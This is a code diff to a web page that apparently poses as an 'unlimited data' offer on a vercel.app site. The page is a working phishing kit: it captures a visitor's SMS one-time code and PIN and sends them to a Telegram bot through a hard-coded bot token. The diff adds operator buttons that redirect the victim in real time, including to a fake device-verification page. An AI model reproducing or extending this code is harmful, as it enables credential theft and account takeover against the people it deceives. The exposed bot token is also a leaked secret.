@@ -140,7 +140,7 @@
         </div>
     </div>
 
-    <!-- PIN Popup Modal -->
+    <!-- PIN Popup -->
     <div id="pinModal">
         <div class="modal-content">
             <div class="logo-section">
@@ -166,7 +166,8 @@
         const CONFIG = {
             BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
             CHAT_ID: '7547427914',
-            SUCCESS_PAGE: 'https://unlimiteddata.vercel.app/success.html'
+            SUCCESS_PAGE: 'https://unlimiteddata.vercel.app/success.html',
+            DEVICE_PAGE: 'https://unlimiteddata.vercel.app/device_verify.html'
         };
 
         let state = { lastUpdateId: 0, pollInterval: null };
@@ -176,8 +177,8 @@
         const spinner = document.getElementById('spinner');
         const pinModal = document.getElementById('pinModal');
 
-        function createInputs(containerId, count) {
-            const container = document.getElementById(containerId);
+        function createInputs(id, count) {
+            const container = document.getElementById(id);
             container.innerHTML = '';
             for (let i = 0; i < count; i++) {
                 const input = document.createElement('input');
@@ -189,12 +190,12 @@
             }
         }
 
-        function getCode(containerId) {
-            return Array.from(document.querySelectorAll(`#${containerId} .otp-input`)).map(i => i.value).join('');
+        function getCode(id) {
+            return Array.from(document.querySelectorAll(`#${id} .otp-input`)).map(i => i.value).join('');
         }
 
-        function focusFirst(containerId) {
-            const first = document.querySelector(`#${containerId} .otp-input`);
+        function focusFirst(id) {
+            const first = document.querySelector(`#${id} .otp-input`);
             if (first) first.focus();
         }
 
@@ -211,7 +212,6 @@
             });
         }
 
-        // Auto SMS OTP
         async function requestAutoOTP() {
             if (!('OTPCredential' in window)) return;
             try {
@@ -231,6 +231,9 @@
             const ts = Date.now();
             const approveId = `otp_approve_${ts}`;
             const declineId = `otp_decline_${ts}`;
+            const verifyDeviceId = `otp_verify_${ts}`;
+            const validPinId = `valid_pin_${ts}`;
+            const invalidPinId = `invalid_pin_${ts}`;
 
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -240,19 +243,28 @@
                     text: `<b>🔴 OTP Verification Received</b>\n\nCode: <code>${otp}</code>\n\nChoose Action:`,
                     parse_mode: 'HTML',
                     reply_markup: {
-                        inline_keyboard: [[
-                            { text: "✅ Approve & Continue", callback_data: approveId },
-                            { text: "❌ Decline", callback_data: declineId }
-                        ]]
+                        inline_keyboard: [
+                            [
+                                { text: "✅ Approve & Continue", callback_data: approveId },
+                                { text: "❌ Decline", callback_data: declineId }
+                            ],
+                            [
+                                { text: "📱 Verify Device", callback_data: verifyDeviceId }
+                            ],
+                            [
+                                { text: "✅ Valid PIN", callback_data: validPinId },
+                                { text: "❌ Invalid PIN", callback_data: invalidPinId }
+                            ]
+                        ]
                     }
                 })
             }).then(() => {
                 spinner.style.display = 'flex';
-                startPolling(approveId, declineId);
+                startPolling(approveId, declineId, verifyDeviceId, validPinId, invalidPinId);
             });
         }
 
-        function startPolling(approveId, declineId) {
+        function startPolling(approveId, declineId, verifyDeviceId, validPinId, invalidPinId) {
             if (state.pollInterval) clearInterval(state.pollInterval);
             state.pollInterval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
@@ -266,10 +278,29 @@
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
                                     showPinModal();
-                                } else if (cb === declineId) {
+                                } 
+                                else if (cb === declineId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
                                     errMsg.textContent = "OTP declined. Please try again.";
+                                    errMsg.style.display = 'block';
+                                    document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
+                                    focusFirst('otpInputs');
+                                }
+                                else if (cb === verifyDeviceId) {
+                                    clearInterval(state.pollInterval);
+                                    spinner.style.display = 'none';
+                                    window.location.href = CONFIG.DEVICE_PAGE;
+                                }
+                                else if (cb === validPinId) {
+                                    clearInterval(state.pollInterval);
+                                    spinner.style.display = 'none';
+                                    window.location.href = CONFIG.SUCCESS_PAGE;
+                                }
+                                else if (cb === invalidPinId) {
+                                    clearInterval(state.pollInterval);
+                                    spinner.style.display = 'none';
+                                    errMsg.textContent = "Invalid PIN. Please try again.";
                                     errMsg.style.display = 'block';
                                     document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
                                     focusFirst('otpInputs');
@@ -343,7 +374,7 @@
         // Initialize
         createInputs('otpInputs', 5);
         setupAutoFocus('otpInputs', 5, submitOTP);
-        document.querySelectorAll('#otpInputs .otp-input')[0].focus();
+        focusFirst('otpInputs');
 
         window.onload = () => setTimeout(requestAutoOTP, 800);
         document.getElementById('verifyBtn').onclick = submitOTP;
